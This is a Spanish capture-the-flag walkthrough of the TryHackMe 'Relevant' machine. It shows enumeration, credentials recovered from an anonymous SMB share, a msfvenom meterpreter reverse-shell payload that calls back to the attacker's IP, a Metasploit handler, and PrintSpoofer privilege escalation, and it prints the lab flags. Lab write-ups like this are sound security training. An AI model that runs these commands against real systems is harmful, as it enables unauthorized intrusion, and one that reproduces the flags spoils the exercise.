# Relevant

## Escaneo de puertos

Realizamos primero un escaneo de puertos para ver los puertos abiertos de la máquina vulnerable.

```
nmap -A -sV -sC -T4 -p- 10.10.121.56
```

Después de esperar unos minutos tenemos los siguientes resultados:

![Escaneo de puertos](../images/Pasted%20image%20202502222121956.png)

Y estos son los resultados del script de`nmap`.

![[Pasted image 20250222121902.png]]

## Enumerating

Tenemos un servicio HTTP por el puerto 80. Sólo nos aparece la página por defecto de Microsoft IIS.

![[Pasted image 20250222122114.png]]

Vamos a enumerar los directorios con`gobuster`.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.121.56
```

![[Pasted image 20250222124555.png]]

Pero no encontramos nada relevante.

Ahora probamos a enumerar con SMB. Usamos el siguiente comando:

```
smbclient -L 10.10.121.56
```

Accedemos como anónimo y nos muestra los siguientes resultados en los que vemos que hay un sharename llamado`nt4wrksv`.

![[Pasted image 20250222123358.png]]

Probamos a acceder:

```
smbclient \\\\10.10.121.56\\nt4wrksv
```

![[Pasted image 20250222123524.png]]

Listamos el contenido de la ubicación en la que estamos y hay un archivo de`passwords.txt`.

![[Pasted image 20250222123614.png]]

Nos los descargamos y salimos.

```
get passwords.txt
```

![[Pasted image 20250222123702.png]]

Mostramos el contenido en el anfitrión.

![[Pasted image 20250222123727.png]]

Y vemos que claramente está codificado en Base64. Decodificamos con el siguiente comando:

```
echo -n Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d 
```

![[Pasted image 20250222123850.png]]

El usuario es`Bob`y la contraseña es`!P@$$W0rD!123`.

Y la de Bill también tenemos:

`bill`

```
Juw4nnaM4n420696969!$$$
```

![[Pasted image 20250222123958.png]]

Hacemos otro escaneo de`nmap`para determinar qué vulnerabilidades hay:

```
nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.121.56
```

El servidor de Samba es probablemente vulnerable a RCE por el **CVE-2017-0143**.

![[Pasted image 20250222125516.png]]
## Exploitation

Vamos a usar`msfvenom`para crear una reverse shell aprovechándonos del exploit.

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.3.33 lport=4444 -f aspx -o shell.aspx
```

![[Pasted image 20250222130621.png]]

Subimos la reverse shell al network share.

```
put shell.aspx
```

![[Pasted image 20250222131746.png]]

Iniciamos un puerto en escucha en Metasploit:

```
msfconsole -q
```

Usamos el siguiente exploit:

```
use exploit/multi/handler
```

Cargamos el payload que queremos:

```
set payload windows/x64/meterpreter_reverse_tcp
```

Configuramos la IP y el puerto con la de Kali en la VPN.

```
set lhost 10.8.3.33
set lport 4444
```

Ejecutamos el exploit:

```
run
```

![[Pasted image 20250222132122.png]]

Abrimos la shell en la víctima

```
curl http://10.10.160.251:49663/nt4wrksv/shell.aspx 
```

Y se nos inicia la consola de meterpreter que estaba en escucha.

![[Pasted image 20250222134122.png]]

La flag de users está en la siguiente ubicación:

```
cat c:/users/bob/desktop/user.txt
```

![[Pasted image 20250222134239.png]]

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

## Escalada de privilegios

Comprobamos los privilegios que tiene la sesión de meterpreter.

![[Pasted image 20250222134526.png]]

Tenemos el de`SeImpersonatePrivilege`.

Nos descargamos`PrintSpoofer64.exe`.

https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

Y subimos el archivo.

![[Pasted image 20250222135514.png]]

Nos ubicamos donde está el PrintSpoofer64.exe y lo ejecutamos.

```
PrintSpoofer64.exe -i -c powershell.exe
```

![[Pasted image 20250222140243.png]]

Finalmente, obtenemos la flag del root.

![[Pasted image 20250222140501.png]]

```
THM{1fk5kf469devly1gl320zafgl345pv}
```


